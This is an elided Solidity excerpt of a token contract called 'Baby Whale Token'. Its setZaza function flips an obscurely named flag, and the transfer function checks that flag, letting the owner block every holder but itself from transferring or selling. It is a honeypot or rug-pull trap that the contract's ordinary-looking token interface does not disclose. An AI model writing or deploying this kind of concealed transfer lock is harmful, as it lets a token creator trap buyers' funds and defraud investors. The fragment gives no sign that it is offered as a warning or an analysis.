...
contract CryptoToken {
    string public constant _name = "Baby Whale Token";
    string public constant _symbol = "BWT";
    ...
    function setZaza(bool status) public virtual returns (bool) {
        _zaza = status;
        return true;
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        require(_zaza || msg.sender == _owner, 'zaza');
